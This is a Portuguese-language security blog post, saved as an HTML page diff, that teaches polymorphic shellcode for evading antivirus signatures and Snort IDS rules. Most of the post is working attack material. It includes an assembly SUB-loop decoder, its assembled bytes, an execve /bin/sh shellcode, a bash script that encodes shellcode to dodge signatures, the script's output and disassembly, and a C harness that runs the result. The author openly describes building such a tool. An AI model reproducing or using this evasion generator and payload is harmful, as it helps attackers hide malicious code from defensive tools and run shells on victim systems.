@@ -1,0 +1,466 @@
+<!DOCTYPE html>
+<html>
+<head>
+	<meta charset="utf-8">
+	<title>Shellcode Polimorficos chamdos Motor polymorphic</title>
+	
+	<meta name="author" content="mh4x0f">
+
+	<!-- Enable responsive viewport -->
+	<meta name="viewport" content="width=device-width, initial-scale=1.0">
+
+	<!-- Le HTML5 shim, for IE6-8 support of HTML elements -->
+	<!--[if lt IE 9]>
+	<script src="http://html5shim.googlecode.com/svn/trunk/html5.js"></script>
+	<![endif]-->
+
+	<!-- Le styles -->
+	<link href="/assets/resources/bootstrap/css/bootstrap.min.css" rel="stylesheet">
+	<link href="/assets/resources/font-awesome/css/font-awesome.min.css" rel="stylesheet">
+	<link href="/assets/resources/syntax/syntax.css" rel="stylesheet">
+	<link href="/assets/css/style.css" rel="stylesheet">
+	<link rel="shortcut icon" type="image/x-icon" href="/favicon.ico">
+	<!-- Le fav and touch icons -->
+	<!-- Update these with your own images
+	<link rel="shortcut icon" href="images/favicon.ico">
+	<link rel="apple-touch-icon" href="images/apple-touch-icon.png">
+	<link rel="apple-touch-icon" sizes="72x72" href="images/apple-touch-icon-72x72.png">
+	<link rel="apple-touch-icon" sizes="114x114" href="images/apple-touch-icon-114x114.png">
+	-->
+
+	<link rel="alternate" type="application/rss+xml" title="" href="/feed.xml">
+</head>
+
+<body>
+	<nav class="navbar navbar-default visible-xs" role="navigation">
+		<!-- Brand and toggle get grouped for better mobile display -->
+		<div class="navbar-header">
+			<button type="button" class="navbar-toggle" data-toggle="collapse" data-target="#bs-example-navbar-collapse-1">
+				<span class="sr-only">Toggle navigation</span>
+				<span class="icon-bar"></span>
+				<span class="icon-bar"></span>
+				<span class="icon-bar"></span>
+			</button>
+			
+			<a type="button" class="navbar-toggle nav-link" href="http://github.com/mh4x0f">
+				<i class="fa fa-github"></i>
+			</a>
+			
+			
+			<a type="button" class="navbar-toggle nav-link" href="http://twitter.com/mh4x0f">
+				<i class="fa fa-twitter"></i>
+			</a>
+			
+			
+			<a type="button" class="navbar-toggle nav-link" href="mailto:mh4root@gmail.com">
+				<i class="fa fa-envelope"></i>
+			</a>
+			
+			<a class="navbar-brand" href="/">
+				<img src="http://avatars.githubusercontent.com/u/6795613" class="img-circle" />
+				
+			</a>
+		</div>
+
+		<!-- Collect the nav links, forms, and other content for toggling -->
+		<div class="collapse navbar-collapse" id="bs-example-navbar-collapse-1">
+			<ul class="nav navbar-nav">
+				<li class="active"><a href="/">Home</a></li>
+				<li><a href="/categories.html">Categories</a></li>
+				<li><a href="/tags.html">Tags</a></li>
+			</ul>
+		</div><!-- /.navbar-collapse -->
+	</nav>
+
+	<!-- nav-menu-dropdown -->
+	<div class="btn-group hidden-xs" id="nav-menu">
+		<button type="button" class="btn btn-default dropdown-toggle" data-toggle="dropdown">
+			<i class="fa fa-bars"></i>
+		</button>
+		<ul class="dropdown-menu" role="menu">
+			<li><a href="/"><i class="fa fa-home"></i>Home</a></li>
+			<li><a href="/categories.html"><i class="fa fa-folder"></i>Categories</a></li>
+			<li><a href="/tags.html"><i class="fa fa-tags"></i>Tags</a></li>
+			<li class="divider"></li>
+			<li><a href="#"><i class="fa fa-arrow-up"></i>Top of Page</a></li>
+		</ul>
+	</div>
+
+	<div class="col-sm-3 sidebar hidden-xs">
+		<!-- sidebar.html -->
+<header class="sidebar-header" role="banner">
+	<a href="/">
+		<img src="http://avatars.githubusercontent.com/u/6795613" class="img-circle" style="width:112px;height:112px;" />
+	</a>
+	<h3 class="title">
+        <a href="/"></a>
+    </h3>
+</header>
+
+
+<div id="bio" class="text-center">
+	One 0x41414141 worth a thousand words
+</div>
+
+<div id="contact-list" class="text-center">
+	<ul class="list-unstyled list-inline">
+		
+		<li>
+			<a class="btn btn-default btn-sm" href="https://github.com/mh4x0f">
+				<i class="fa fa-github-alt fa-lg"></i>
+			</a>
+		</li>
+		
+		
+		<li>
+			<a class="btn btn-default btn-sm" href="https://twitter.com/mh4x0f">
+				<i class="fa fa-twitter fa-lg"></i>
+			</a>
+		</li>
+		
+		
+		<li>
+			<a class="btn btn-default btn-sm" href="mailto:mh4root@gmail.com">
+				<i class="fa fa-envelope fa-lg"></i>
+			</a>
+		</li>
+		
+	</ul>
+	<ul id="contact-list-secondary" class="list-unstyled list-inline">
+		
+		
+		<form class="col-lg-12" action="http://feedburner.google.com/fb/a/mailverify?uri=chmodsecurity" method="post" target="popupwindow" onsubmit="window.open('http://feedburner.google.com/fb/a/mailverify?uri=chmodsecurity', 'popupwindow', 'scrollbars=yes,width=250,height=220');return true" >
+			<div class="input-group" style="width:240px;text-align:center;margin:0 auto;">
+			<input type="hidden" value="chmodsecurity" name="uri" >
+		  <input type="hidden" name="loc" value="pt_BR">
+		  <input  id="input-rss"  style="width:160px;text-align:center;" placeholder="Digite  seu e-mail" class="form-control input-lg" type="text" name="email">
+		  <span class="input-group-btn"><button id="btn-assinar" class="btn btn-lg btn-primary"  type="submit" value=" ASSINAR ">Assinar</button></span>
+	      </div>
+		</form>
+	</ul>
+</div>
+<!-- sidebar.html end -->
+
+	</div>
+
+	<div class="col-sm-9 col-sm-offset-3">
+		<div class="page-header">
+  <h1>Shellcode Polimorficos chamdos Motor polymorphic </h1>
+</div>
+	
+<article>
+	<div class="col-sm-10">
+	 <span class="post-date">
+	   
+	   August 
+	   6th,
+	   
+	   2014
+	 </span>
+	  <div class="article_body">
+	  <p>Sempre que um método para fazer bypass é desenvolvido dificilmente encontra-se uma maneira eficaz de controla-lo, isso pelo simples falo que atacar é sempre mais fácil do que defender, as empresa de Anti-virus AV, que o diga... O que me chamou a atenção foi métodos criados há muito tempo atras que hoje em dia pode-se ajusta-los para que possa funcionar "liso" em qualquer versão do windows. Muitas vezes você encontra alguns métodos que acha-se que é novo, mas é apenas uma adaptação dos métodos mais antigos: por exemplo metasploit , um framework feito em ruby que tem a capacidade de gerar shellcode's, certo ele tem muitos encode's que são inéditos, mas a maiorias são antigos. Uma coisa que vejo como 'top' é o meterpreter que foi uma evolução de um Trojan a novidade é que ele injeta na memoria podendo ocupar espaço de processo alocados na memoria e assim trabalhar em cima deles "migrate". mas isso já existia antigamente os chamado "Inject process ou inject dll ". A muitas formas de fazer bypass essa talvez seja o grande problemas dos AV, na verdade isso é bom pra eles já que é o ganha pão. Em algumas de minhas pesquisas achei o tema Shellcode Polymorphic é nada mais que é encodar o shellcode e falar <a>olha seu shellcode você vai ter a chave</a> apenas você conseguirá abrir a porta. Vamos fazer uma greve comparação mais a função sabe o token dos bancos que gera uma chave constantemente é isso, shellcode polimórficos faz o mesmo a cada vírus gerado um é totalmente diferente do outro pois cada um tempo seu token para ser descryptografado. Estou trabalhando em algum do tipo agora, na verdade está quase pronto para ser testando deixa sair o windows 9 primeiro rsrrs. A primeira vez que se ouviu falar nesse tipo de shellcode foi com um tal de <a>Dark Avenger</a>.em um paper em 1992 (eu nem sonhava em nascer ainda :D), foi dai a ideia maligna dai surgiu o Dark Angel Mutation Engine (DAME) ou ADMmutate é uma primeira tentativa pública de aplicar polimorfismo shellcode. olha só como fica:</p>
+<pre class="code">
+--------------------
+call decryptor
+--------------------
+shellcode
+--------------------
+decryptor
+--------------------
+jmp shellcode
+--------------------
+</pre>
+<p>O Decoder é onde ta toda a mágica pois ele vai descifrar o shellcode que pode ser encodado em XOR,ADD,- SUB - XOR - DES, o grande lance do polimórficos é a qualidade de sair dos padrões, tipo toda vez que um vírus novo surgi e cai em um scanner tipo virus total, o mesmo será analisado e posteriormente adicionado nas assinaturas como vírus, até ai tudo bem,assim toda que vez que o AV achar o payload vai detectar como vírus, com um payload polimórficos é a mesma coisa, porém cada vez que um payload é gerado ele vai conter o código diferente do outro gerado anterior isso que dizer que os AVs poderá detectar e adicionar no banco, mas quando o próximo gerado vai está com código diferente e com isso precisará de outra assinatura, :D isso é muito foda...Os shellcode Polimórficos também foi muito usado para fazer bypass em NIDS,os IDS faz o seguinte suponhamos que queremos injetar um payload  shell /bin/sh mandar em um pacote  siga o exemplo:</p>
+<pre class="code">
+Shellcode /bin/sh execve
+execve ("/ bin / bash", ["/ bin / bash", NULL], NULL)
+-------------------------------------------------|                       Filtro Snort --------------|             |-------------------------------------|
+"\x6a\x0b\x58\x99\x52\x66\x68\x2d\x70"|                                                           |              |                                              |
+"\x89\xe1\x52\x6a\x68\x68\x2f\x62\x61" |-----------------------------------------------V----------|-|     Servidor com Snort         |68 2f 62 61 73
+"\x73\x68\x2f\x62\x69\x6e\x89\xe3\x52" |              Shellcode Passando ---&gt;      |              |                                              |
+ "\x51\x53\x31\xc9\xcd\x80"                   |                                                           |              |-------------------------------------|
+-------------------------------------------------|                                                           | Regra Snort: If (find.string == "x68\x2f\x62\x69\x6e\x68\x2f\x62\x61\x73" )
+                                                                                                                                                   {
+                                                                                                                                                            printf("não permitido, pacote contém /bin/bash ");
+                                                                                                                                                    }
+
+</pre>
+<p>No primeiro  exemplo citado acima nosso decoder vai pa Stack e logo em seguida colocamos o shellcode,o decoder vai pegar o endereço do nosso shellcode logo em seguida irá efetuar o jmp mover para algum registrador para fazer o descrypt do shellcode, já no segundo exemplo mostro na "teoria"exemplo tosco :(, como funciona o nosso IDS ele verifica o pacote no caso nosso shellcode se contém a string /bin/bash se convertermos para  ascii fica sab/nib/  que é um shellcode maliciosa se chamarmos uma syscall 69 e colocar como argumento teremos uma /bin/sh da vida. o que tentei mostrar foi como essa regra não funcionaria com shellcode polimórficos já que a string vai está encodada e só na stack já na memoria ela vai ser descriptografada.Obviamente, existem outros métodos para fazer uma chamada de execve, no entanto, ele vai fazer uma outra assinatura. Isso é o que chamamos de padrão de correspondência. Fale sobre vírus ou shellcodes não é importante, os princípios são os mesma. Veremos mais adiante as especificidades de shellcodes. depois desse modelo de Polymorphic foi surgindo ideias ainda mais malignas como gerar um código falso entre o código de decifração verdade. Por exemplo, se não utilizar alguns registros, você pode jogar com eles, tornando as operações falsas  no meio do código de decifração eficaz, e ainda encriptar as classes e métodos usar operações tais como: já citadas  ADD / SUB, ROL / ROR, etc... A principal razão para escrever o código polimórfico é evitar ser hashwise identificado , ou ter código de assinatura detectados, ou seja, IDS ou anti-vírus contra medidas não podem identificar a carga útil, como é muito bem embrulhado-up em sua própria forma criptografada . Outra razão é que se propaguem a cópias múltiplas sem ter a mesma assinatura. Muitos fornecedores de software legítimo também produzem polimórficos binários para proteger suas aplicações de software rachaduras e engenharia reversa. Ao escrever shellcode , o polimorfismo é utilizado para criar shellcode ascii e shellcode alfanumérico devido ao conjunto de instruções restritivas. uma boa opção de shellcode Poly usando syscall é usar a sua matemática ao seu favor como explico no artigo anterior, </p>
+<pre class="code">
+BITS 32
+jmp short jmptrick // 
+decoder:
+pop esi
+xor ecx,ecx
+mov cl,0
+loop:
+sub byte [esi+ecx-1],0
+dec cl
+jnz loop
+jmp short obfuscated_code
+jmptrick:
+call decoder
+obfuscated_code:
+</pre>
+<p> A ideia aqui é fazer com que nosso decoder chame o shellcode e por meio de um loop faça o decode do shellcode usando o método sub, Lembre-se que nós decidir para gerar uma rotina decifrar diferente de cada vez. mesmo que mude o tipo de cifragem de cada vez, é importante demais para modificar instruções asembler que fazem essa rotina decifrar. Para fazê-lo, decidimos mudar registradores usados. Precisamos de três registros, um para o endereço de registro onde estamos trabalhando, para gravar um byte estamos trabalhando on, mais um registo para todas as outras coisas. Temos a escolha entre EAX, EBX, ECX, EDX. Assim, podemos usar aleatoriamente três desta registra cada momento. vamos compliar:</p>
+<pre class="code">
+# nasm -f elf decoder.asm
+# ld -o decoder decoder.o
+# od2sc decoder
+"\xeb\x10\x5e\x31\xc9\xb1\x00\x80\x6c\x0e\xff\x00\xfe\xc9\x75\xf7\xeb\x05\xe8\xeb\xff\xff\xff" &lt;-----  Nosso Decoder :D 
+</pre>
+<p> Vamos utilizar o shellcode  execve() básico :</p>
+
+<div class="highlight"><pre><code class="language-c--" data-lang="c++"><span class="cp">#include&lt;stdio.h&gt;</span>
+<span class="cp">#include&lt;stdlib.h&gt;</span>
+<span class="n">main</span><span class="p">()</span> <span class="p">{</span>
+<span class="n">execve</span><span class="p">(</span><span class="s">&quot;hello&quot;</span><span class="p">,</span><span class="nb">NULL</span><span class="p">,</span><span class="nb">NULL</span><span class="p">);</span>
+<span class="p">}</span>
+<span class="nl">shellcode</span> <span class="p">:</span> <span class="s">&quot;</span><span class="se">\x31\xc0\x99\xb0\x0b\x52\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x52\x89\xe2\x53\x89\xe1\xcd\x80</span><span class="s">&quot;</span></code></pre></div>
+
+<p>Agora é  preciso um script para gerar o nosso shellcode polimórfico ele vai pegar o endereço da função calll e jogar  calcular o tamanho da offset.</p>
+
+<div class="highlight"><pre><code class="language-sh" data-lang="sh"><span class="c">#!/bin/bash</span>
+
+<span class="c"># Name:   shellcodepoly (polymorphic shellcode generator)</span>
+<span class="c"># Usage:  shellcodepoly &lt;shellcode&gt; [offset]</span>
+
+<span class="nv">shellcode</span><span class="o">=</span><span class="s2">&quot;$1&quot;</span>
+<span class="nv">offset</span><span class="o">=</span><span class="s2">&quot;$2&quot;</span>
+
+<span class="nv">bytes</span><span class="o">=</span><span class="sb">`</span><span class="nb">echo</span> <span class="nv">$shellcode</span> <span class="p">|</span> tr -d <span class="se">\&quot;</span> <span class="p">|</span> sed <span class="s1">&#39;s/\\\x/\n/g&#39;</span> <span class="p">|</span> grep -v ^<span class="nv">$`</span>
+<span class="nv">max</span><span class="o">=</span><span class="sb">`</span><span class="nb">echo</span> <span class="s2">&quot;$bytes&quot;</span> <span class="p">|</span> sort -ru <span class="p">|</span> head -n1<span class="sb">`</span>
+<span class="nv">length</span><span class="o">=</span>0
+<span class="nv">decoder</span><span class="o">=</span><span class="s2">&quot;\xeb\x10\x5e\x31\xc9\xb1\x00\x80\x6c\x0e\xff\x00\xfe\xc9\x75\xf7\xeb\x05\xe8\xeb\xff\xff\xff&quot;</span>
+
+<span class="k">if</span> <span class="o">[</span> <span class="s2">&quot;$offset&quot;</span> <span class="o">==</span> <span class="s2">&quot;&quot;</span> <span class="o">]</span><span class="p">;</span> <span class="k">then</span> <span class="nv">offset</span><span class="o">=</span><span class="sb">`</span>bconv FF-<span class="nv">$max</span> x x<span class="sb">`</span><span class="p">;</span> <span class="k">fi</span>
+
+<span class="nb">echo</span> <span class="s2">&quot;&quot;</span>
+<span class="nb">echo</span> <span class="s2">&quot;input      = \&quot;$shellcode\&quot;&quot;</span>
+<span class="nb">echo</span> <span class="s2">&quot;offset     = 0x$offset&quot;</span>
+
+<span class="k">for</span> byte in <span class="sb">`</span><span class="nb">echo</span> <span class="s2">&quot;$bytes&quot;</span><span class="sb">`</span><span class="p">;</span> <span class="k">do</span>
+        <span class="nv">length</span><span class="o">=</span><span class="sb">`</span>bconv <span class="nv">$length</span>+1 x x<span class="sb">`</span>
+        <span class="nv">obfuscated</span><span class="o">=</span><span class="k">$(</span><span class="nb">echo</span> -n <span class="s2">&quot;$obfuscated\x`bconv $byte+$offset x x`&quot;</span><span class="k">)</span>
+<span class="k">done</span>
+
+<span class="nb">echo</span> <span class="s2">&quot;obfuscated = \&quot;$obfuscated\&quot;&quot;</span>
+<span class="nb">echo</span> <span class="s2">&quot;length     = 0x$length&quot;</span>
+
+<span class="nv">decoder</span><span class="o">=</span><span class="sb">`</span><span class="nb">echo</span> <span class="nv">$decoder</span> <span class="p">|</span> sed -e <span class="s2">&quot;s/00/$length/&quot;</span> -e <span class="s2">&quot;s/00/$offset/&quot;</span><span class="sb">`</span>
+
+<span class="nb">echo</span> <span class="s2">&quot;decoder    = \&quot;$decoder\&quot;&quot;</span>
+<span class="nb">echo</span> <span class="s2">&quot;&quot;</span>
+
+<span class="nv">output</span><span class="o">=</span><span class="s2">&quot;$decoder$obfuscated&quot;</span>
+
+<span class="nb">echo</span> <span class="s2">&quot;output  = \&quot;$output\&quot;&quot;</span>
+<span class="nb">echo</span> <span class="s2">&quot;&quot;</span>
+<span class="nb">echo</span> -ne <span class="nv">$output</span> <span class="p">|</span> ndisasm -u -</code></pre></div>
+
+<p>Executando:</p>
+
+<div class="highlight"><pre><code class="language-c--" data-lang="c++"><span class="cp"># ./shellcodepoly.sh &quot;\x31\xc0\x99\xb0\x0b\x52\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x52\x89\xe2\x53\x89\xe1\xcd\x80&quot; </span>
+<span class="n">input</span>      <span class="o">=</span> <span class="s">&quot;</span><span class="se">\x31\xc0\x99\xb0\x0b\x52\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x52\x89\xe2\x53\x89\xe1\xcd\x80</span><span class="s">&quot;</span>
+<span class="n">offset</span>     <span class="o">=</span> <span class="mh">0x1c</span>
+<span class="n">obfuscated</span> <span class="o">=</span> <span class="s">&quot;</span><span class="se">\x4d\xdc\xb5\xcc\x27\x6e\x84\x4b\x4b\x8f\x84\x84\x4b\x7e\x85\x8a\xa5\xff\x6e\xa5\xfe\x6f\xa5\xfd\xe9\x9c</span><span class="s">&quot;</span>
+<span class="n">length</span>     <span class="o">=</span> <span class="mh">0x1a</span>
+<span class="n">decoder</span>    <span class="o">=</span> <span class="s">&quot;</span><span class="se">\xeb\x10\x5e\x31\xc9\xb1\x1a\x80\x6c\x0e\xff\x1c\xfe\xc9\x75\xf7\xeb\x05\xe8\xeb\xff\xff\xff</span><span class="s">&quot;</span>
+
+<span class="n">output</span>  <span class="o">=</span> <span class="s">&quot;</span><span class="se">\xeb\x10\x5e\x31\xc9\xb1\x1a\x80\x6c\x0e\xff\x1c\xfe\xc9\x75\xf7</span><span class="s">\</span>
+<span class="s">xeb</span><span class="se">\x05\xe8\xeb\xff\xff\xff\x4d\xdc\xb5</span><span class="s">\</span>
+<span class="s">xcc</span><span class="se">\x27\x6e\x84\x4b\x4b\x8f\x84\x84\x4b\x7e\x85\x8a\xa5\xff\x6e\xa5\xfe\x6f\xa5\xfd\xe9\x9c</span><span class="s">&quot;</span>
+
+<span class="mo">00000000</span>  <span class="n">EB10</span>              <span class="n">jmp</span> <span class="kt">short</span> <span class="mh">0x12</span>
+<span class="mo">00000002</span>  <span class="mi">5</span><span class="n">E</span>                <span class="n">pop</span> <span class="n">esi</span>
+<span class="mo">00000003</span>  <span class="mi">31</span><span class="n">C9</span>              <span class="n">xor</span> <span class="n">ecx</span><span class="p">,</span><span class="n">ecx</span>
+<span class="mo">00000005</span>  <span class="n">B11A</span>              <span class="n">mov</span> <span class="n">cl</span><span class="p">,</span><span class="mh">0x1a</span>
+<span class="mo">00000007</span>  <span class="mi">806</span><span class="n">C0EFF1C</span>        <span class="n">sub</span> <span class="n">byte</span> <span class="p">[</span><span class="n">esi</span><span class="o">+</span><span class="n">ecx</span><span class="o">-</span><span class="mh">0x1</span><span class="p">],</span><span class="mh">0x1c</span>
+<span class="mo">0000000</span><span class="n">C</span>  <span class="n">FEC9</span>              <span class="n">dec</span> <span class="n">cl</span>
+<span class="mo">0000000</span><span class="n">E</span>  <span class="mf">75F</span><span class="mi">7</span>              <span class="n">jnz</span> <span class="mh">0x7</span>
+<span class="mo">00000010</span>  <span class="n">EB05</span>              <span class="n">jmp</span> <span class="kt">short</span> <span class="mh">0x17</span>
+<span class="mo">00000012</span>  <span class="n">E8EBFFFFFF</span>        <span class="n">call</span> <span class="n">dword</span> <span class="mh">0x2</span>
+<span class="mo">00000017</span>  <span class="mi">4</span><span class="n">D</span>                <span class="n">dec</span> <span class="n">ebp</span>
+<span class="mo">0000001</span><span class="mi">8</span>  <span class="n">DCB5CC276E84</span>      <span class="n">fdiv</span> <span class="n">qword</span> <span class="p">[</span><span class="n">ebp</span><span class="o">-</span><span class="mh">0x7b91d834</span><span class="p">]</span>
+<span class="mo">0000001</span><span class="n">E</span>  <span class="mi">4</span><span class="n">B</span>                <span class="n">dec</span> <span class="n">ebx</span>
+<span class="mf">0000001F</span>  <span class="mi">4</span><span class="n">B</span>                <span class="n">dec</span> <span class="n">ebx</span>
+<span class="mo">00000020</span>  <span class="mf">8F</span><span class="mi">84844</span><span class="n">B7E858A</span>    <span class="n">pop</span> <span class="n">dword</span> <span class="p">[</span><span class="n">esp</span><span class="o">+</span><span class="n">eax</span><span class="o">*</span><span class="mi">4</span><span class="o">-</span><span class="mh">0x757a81b5</span><span class="p">]</span>
+<span class="mo">00000027</span>  <span class="n">A5</span>                <span class="n">movsd</span>
+<span class="mo">0000002</span><span class="mi">8</span>  <span class="n">FF6EA5</span>            <span class="n">jmp</span> <span class="n">dword</span> <span class="n">far</span> <span class="p">[</span><span class="n">esi</span><span class="o">-</span><span class="mh">0x5b</span><span class="p">]</span>
+<span class="mo">0000002</span><span class="n">B</span>  <span class="n">FE</span>                <span class="n">db</span> <span class="mh">0xfe</span>
+<span class="mo">0000002</span><span class="n">C</span>  <span class="mf">6F</span>                <span class="n">outsd</span>
+<span class="mo">0000002</span><span class="n">D</span>  <span class="n">A5</span>                <span class="n">movsd</span>
+<span class="mo">0000002</span><span class="n">E</span>  <span class="n">FD</span>                <span class="n">std</span>
+<span class="mf">0000002F</span>  <span class="n">E9</span>                <span class="n">db</span> <span class="mh">0xe9</span>
+<span class="mo">00000030</span>  <span class="mi">9</span><span class="n">C</span>                <span class="n">pushfd</span></code></pre></div>
+
+<p>temos nosso shellcode +  decoder ,precisamos criar um ponteiro e direcionar nosso shellcode para o mesmo fazendo assim ele executar na memória devolvendo uma execve() no linux .</p>
+
+<div class="highlight"><pre><code class="language-c--" data-lang="c++"><span class="cp">#include &lt;stdio.h&gt;</span>
+
+<span class="kt">char</span> <span class="n">shellcode</span><span class="p">[]</span><span class="o">=</span><span class="s">&quot;</span><span class="se">\xeb\x10\x5e\x31\xc9\xb1\x1a\x80\x6c\x0e\xff\x1c\xfe\xc9</span>
+<span class="err">\</span><span class="n">x75</span><span class="err">\</span><span class="n">xf7</span><span class="err">\</span><span class="n">xeb</span><span class="err">\</span><span class="n">x05</span><span class="err">\</span><span class="n">xe8</span><span class="err">\</span><span class="n">xeb</span><span class="err">\</span><span class="n">xff</span><span class="err">\</span><span class="n">xff</span><span class="err">\</span><span class="n">xff</span><span class="err">\</span><span class="n">x4d</span><span class="err">\</span><span class="n">xdc</span><span class="err">\</span><span class="n">xb5</span><span class="err">\</span><span class="n">xcc</span><span class="err">\</span><span class="n">x27</span><span class="err">\</span><span class="n">x6e</span><span class="err">\</span><span class="n">x84</span><span class="err">\</span><span class="n">x4b</span><span class="err">\</span><span class="n">x4b</span><span class="err">\</span><span class="n">x8f</span><span class="err">\</span><span class="n">x84</span><span class="err">\</span><span class="n">x84</span><span class="err">\</span><span class="n">x4b</span><span class="err">\</span><span class="n">x7e</span>\
+<span class="n">x85</span><span class="err">\</span><span class="n">x8a</span><span class="err">\</span><span class="n">xa5</span><span class="err">\</span><span class="n">xff</span><span class="err">\</span><span class="n">x6e</span><span class="err">\</span><span class="n">xa5</span><span class="err">\</span><span class="n">xfe</span><span class="err">\</span><span class="n">x6f</span><span class="err">\</span><span class="n">xa5</span><span class="err">\</span><span class="n">xfd</span><span class="err">\</span><span class="n">xe9</span><span class="err">\</span><span class="n">x9c</span><span class="s">&quot;;</span>
+<span class="kt">int</span> <span class="nf">main</span><span class="p">(){</span>
+        <span class="kt">int</span> <span class="o">*</span><span class="n">ret</span><span class="p">;</span> <span class="c1">//criando ponteiro </span>
+        <span class="n">ret</span><span class="o">=</span><span class="p">(</span><span class="kt">int</span><span class="o">*</span><span class="p">)</span><span class="o">&amp;</span><span class="n">ret</span><span class="o">+</span><span class="mi">2</span><span class="p">;</span> 
+        <span class="p">(</span><span class="o">*</span><span class="n">ret</span><span class="p">)</span><span class="o">=</span><span class="p">(</span><span class="kt">int</span><span class="p">)</span><span class="n">shellcode</span><span class="p">;</span>  
+<span class="p">}</span>
+<span class="cp"># gcc -z execstack -o shellcode shellcode.c</span>
+<span class="cp"># ./shellcode</span>
+<span class="cp"># exit</span></code></pre></div>
+
+<h3>Conclusão e solução </h3>
+<p>Quando foi descoberto polimorfismo, autores de antivírus estavam com medo  que era a melhor solução e que a correspondência de padrão estava morto. Para lutar esse novo tipo de vírus, eles decidiram modificar o seu  ataques. Antivirus com análise heurística nasceram. Este antivírus tentativas por exemplo, para executar o código na memória e teste se modifica esse código suas próprias instruções (se ele tentar decifrá-lo,por exemplo), de tal um processo, que pode ser um vírus polymorphed.Será IDS tomar exemplo na antivírus e tentar implementar heurística ? Nós não pensamos assim, porque existe uma grande diferença entre o IDS e antivírus, IDS têm de trabalhar em modo de relógio de tempo real. Eles não podem gravar todos os pacotes e analisá-los mais tarde. Talvez uma abordagem heurística não será utilizado. Além disso, IDS Snort, que tenta desenvolver métodos contra shellcodes polymorphed, não use métodos heurísticos, mas a mineração de dados métodos. É provavelmente esses métodos, que será elaborada, de modo que é contra estes métodos nós tentamos criar shellcodes polimórficos como nós explicar em 5,3 depois de ter dado uma explicação rápida sobre mineração de dados métodos.</p>
+
+	  </div>
+
+		
+		<ul class="tag_box list-unstyled list-inline">
+		  <li><i class="fa fa-folder-open"></i></li>
+		  
+		  
+			 
+				<li><a href="/categories.html#shellcode-ref">
+					shellcode <span>(1)</span>
+					
+				</a></li>
+			
+		  
+		</ul>
+		  
+
+		
+		<ul class="list-inline">
+		  <li><i class="fa fa-tags"></i></li>
+		  
+		  
+			 
+				<li>
+					<a href="/tags.html#encode-ref">
+					encode <span>(1)</span>
+					,
+					</a>
+				</li>
+			 
+				<li>
+					<a href="/tags.html#shellcode-ref">
+					shellcode <span>(3)</span>
+					,
+					</a>
+				</li>
+			 
+				<li>
+					<a href="/tags.html#motor polymorphic-ref">
+					motor polymorphic <span>(1)</span>
+					
+					</a>
+				</li>
+			
+		  
+		  
+		</ul>
+		  
+
+		<hr>
+
+		<div>
+      <section class="share col-sm-6">
+        <h4 class="section-title">Share Post</h4>
+        <a class="btn btn-default btn-sm twitter" href="http://twitter.com/share?text=Shellcode Polimorficos chamdos Motor polymorphic&via=mh4x0f"
+           onclick="window.open(this.href, 'twitter-share', 'width=550,height=235');return false;">
+          <i class="fa fa-twitter fa-lg"></i>
+          Twitter
+        </a>
+        <a class="btn btn-default btn-sm facebook" href="https://www.facebook.com/sharer/sharer.php"
+           onclick="window.open(this.href, 'facebook-share','width=580,height=296');return false;">
+          <i class="fa fa-facebook fa-lg"></i>
+          Facebook
+        </a>
+        <a class="btn btn-default btn-sm gplus"
+           onclick="window.open('https://plus.google.com/share?url='+window.location.href, 'google-plus-share', 'width=490,height=530');return false;">
+          <i class="fa fa-google-plus fa-lg"></i>
+          Google+
+        </a>
+      </section>
+
+      <section class="col-sm-6 author">
+        <img src="http://avatars.githubusercontent.com/u/6795613" style="width:80px;height:80px;" class="img-rounded author-image" />
+        <h4 class="section-title author-name">mh4x0f</h4>
+        <p class="author-bio">One 0x41414141 worth a thousand words</p>
+      </section>
+    </div>
+
+    <div class="clearfix"></div>
+
+		<ul class="pager">
+		  
+		  <li class="previous"><a href="/exploit%20developer/2014/07/28/Heap%20Overflow%20Na%20pratica%200x05.html" title="Heap Overflow Na pratica 0x05">&larr; Previous</a></li>
+		  
+		  
+		  <li class="next"><a href="/asm/2014/08/07/Tecnicas%20Avancadas%20Shellcoding%20%5BAssembly%5D.html" title="Tecnicas Avançadas Shellcoding [asm]">Next &rarr;</a></li>
+		  
+		</ul>
+
+		<hr>
+	</div>
+	
+	<div class="col-sm-2 sidebar-2">
+	
+	</div>
+</article>
+<div class="clearfix"></div>
+
+
+
+    
+<div id="disqus_thread"></div>
+<script type="text/javascript">
+    /* * * CONFIGURATION VARIABLES * * */
+    var disqus_shortname = 'mh4x0fblog';
+
+    /* * * DON'T EDIT BELOW THIS LINE * * */
+    (function() {
+        var dsq = document.createElement('script'); dsq.type = 'text/javascript'; dsq.async = true;
+        dsq.src = '//' + disqus_shortname + '.disqus.com/embed.js';
+        (document.getElementsByTagName('head')[0] || document.getElementsByTagName('body')[0]).appendChild(dsq);
+    })();
+</script>
+<noscript>Please enable JavaScript to view the <a href="https://disqus.com/?ref_noscript" rel="nofollow">comments powered by Disqus.</a></noscript>
+
+
+
+
+
+		<footer>
+			<hr/>
+			<p>
+				&copy; 2015 mh4x0f with Jekyll. Theme: <a href="https://github.com/dbtek/dbyll">dbyll</a> by dbtek.
+			</p>
+		</footer>
+	</div>
+
+	<script type="text/javascript" src="/assets/resources/jquery/jquery.min.js"></script>
+	<script type="text/javascript" src="/assets/resources/bootstrap/js/bootstrap.min.js"></script>
+	<script type="text/javascript" src="/assets/js/app.js"></script>
+</body>
+</html>
+
+
+
+<!-- Asynchronous Google Analytics snippet -->
+<script>
+  var _gaq = _gaq || [];
+  var pluginUrl =
+ '//www.google-analytics.com/plugins/ga/inpage_linkid.js';
+  _gaq.push(['_require', 'inpage_linkid', pluginUrl]);
+  _gaq.push(['_setAccount', 'mh4x0f']);
+  _gaq.push(['_trackPageview']);
+
+  (function() {
+    var ga = document.createElement('script'); ga.type = 'text/javascript'; ga.async = true;
+    ga.src = ('https:' == document.location.protocol ? 'https://ssl' : 'http://www') + '.google-analytics.com/ga.js';
+    var s = document.getElementsByTagName('script')[0]; s.parentNode.insertBefore(ga, s);
+  })();
+</script>
+
